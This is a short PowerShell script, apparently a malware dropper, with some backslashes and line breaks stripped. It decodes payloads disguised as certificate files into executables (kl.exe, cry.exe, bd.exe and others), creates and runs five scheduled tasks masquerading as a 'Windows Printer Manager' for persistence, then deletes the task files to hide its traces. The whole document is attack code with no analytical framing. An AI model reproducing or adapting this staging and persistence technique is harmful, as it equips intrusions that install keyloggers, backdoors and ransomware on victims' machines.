$loot = ($env:LOCALAPPDATA + "dyna"); md $lootncertutil -decode res.crt ($loot + "res"); certutil -decode kl.crt ($loot + "kl.exe"); certutil -decode st.crt ($loot + "st.exe");  certutil -decode cry.crt ($loot + "cry.exe"); certutil -decode t1.crt ($env:TEMP + "t1.xml"); certutil -decode t2.crt ($env:TEMP + "t2.xml"); certutil -decode t3.crt ($env:TEMP + "t3.xml"); certutil -decode t4.crt ($env:TEMP + "t4.xml"); certutil -decode t5.crt ($env:TEMP + "t5.xml"); certutil -decode bd.crt C:ProgramDatabd.exenschtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager1" /XML ($env:TEMP + "t1.xml")nschtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager2" /XML ($env:TEMP + "t2.xml")nschtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager3" /XML ($env:TEMP + "t3.xml")nschtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager4" /XML ($env:TEMP + "t4.xml")nschtasks.exe /create /TN "MicrosoftWindowsWindows Printer Manager5" /XML ($env:TEMP + "t5.xml")nschtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager1"nschtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager2"nschtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager3"nschtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager4"nschtasks.exe /run /TN "MicrosoftWindowsWindows Printer Manager5"nRemove-Item ($env:TEMP + "*.xml") -Recurse -Force